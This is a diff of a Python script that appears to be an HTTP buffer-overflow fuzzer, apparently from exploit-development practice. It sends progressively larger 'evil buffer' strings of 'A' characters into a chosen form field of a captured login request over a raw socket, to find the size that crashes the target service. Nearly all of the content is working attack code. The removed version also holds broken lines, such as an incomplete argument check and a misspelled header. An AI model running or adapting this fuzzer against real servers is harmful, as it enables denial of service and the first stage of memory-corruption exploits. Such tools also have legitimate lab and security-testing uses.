@@ -3,57 +3,39 @@ import socket
 import time
 import sys
 
-if len(sys.argv) != :
-    print("\n Usage : " + sys.argv[0] + "<method> <target url> <userform> <passform>")
-    exit(1)
+if len(sys.argv) != 5:
+    print("\n Usage : " + sys.argv[0] + " <request file> <host ip> <port> <target form tag name>")
+    sys.exit(1)
 
-method = sys.argv[1].upper()
-target = sys.argv[2].split("/")
-if len(target[0].split("https")) > 1:
-    referer= sys.argv[1]
-    host = target[2]
-    path = target[8+len(host):len(sys.argv[2])]
-elif len(target[0].split("http")) > 1:
-    referer= sys.argv[1]
-    host = target[2]
-    path = target[7+len(host):len(sys.argv[2])]
-else:
-    referer= "http://" + sys.argv[1]
-    host = target[0]
-    path = target[len(host):len(sys.argv[2])]
-
-userform = sys.argv[3]
-passform = sys.argv[4]
-
+host = sys.argv[2]
+port = int(sys.argv[3])
+targetform = sys.argv[4]
 size = 100
 
 while(size < 2000):
     try:
-        print "\nSending evil buffer with %s bytes" % size
-        
+        print("\nsending evil buffer with " + str(size) + " bytes")
+        buffer = ""
         inputBuffer = "A" * size
-
-        content = userform + "=" + inputBuffer + "&" + passform + "=A"
-
-        buffer += method + " " + path + " HTTP/1.1\r\n"
-        buffer += "Host: " + host + "\r\n"
-        buffer += "Uaer-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-        buffer += "Accept: text/html,application/xhtml+xml,application/xml;1=0.9,*/*;q=0.8\r\n"
-        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
-        buffer += "Referer: " + referer + "\r\n"
-        buffer += "Connection: close\r\n"
-        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
-        buffer += "Content-Length: " + str(len(content)) + "\r\n"
-        buffer += "\r\n"
-
-        buffer += content
-
+        f = open(sys.argv[1], 'r')
+        line = f.readline().replace("\n","\r\n")
+        while len(line) > 0:
+            if len(line.split("Content-Length")) > 1:
+                line = "Content-Length: {to modify}\r\n"
+            if len(line.split(targetform)) > 1:
+                content = targetform + "=" + inputBuffer + "&" + line.split(targetform)[1].split("&")[1]
+                line = content
+            buffer += line
+            line = f.readline().replace("\n","\r\n")
+        f.close()
+        buffer = buffer.replace("{to modify}", str(len(content)))
+        #print(bytes(buffer, "utf-8")) # debug
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        s.connect((host, 80))
-        s.send(buffer)
-
+        s.connect((host, port))
+        s.send(bytes(buffer, "utf-8"))
         s.close()
-
         size += 100
         time.sleep(10)
+    except:
+        print("\nERROR : Could not connect")
+        sys.exit(1)
